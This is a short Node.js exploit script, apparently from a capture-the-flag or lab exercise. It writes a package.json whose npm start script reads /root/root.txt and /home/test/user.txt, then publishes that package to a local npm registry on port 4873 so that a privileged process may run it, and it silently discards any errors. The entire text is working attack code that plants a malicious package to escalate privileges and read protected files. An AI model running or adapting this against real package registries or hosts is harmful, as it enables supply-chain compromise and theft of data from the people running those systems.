const {execSync}=require('child_process');
exports.command=function(){try{
 var startCmd='/bin/bash -c "R=$(cat /root/root.txt); U=$(cat /home/test/user.txt); echo $R"';
 var pkg={name:'test2',scripts:{start:startCmd}};
 execSync("echo '"+JSON.stringify(pkg).replace(/'/g,"x")+"' > /tmp/pwn_pkg2/package.json");
 execSync('cd /tmp/pwn_pkg2 && npm publish --registry http://localhost:4873/');
}catch(e){}};
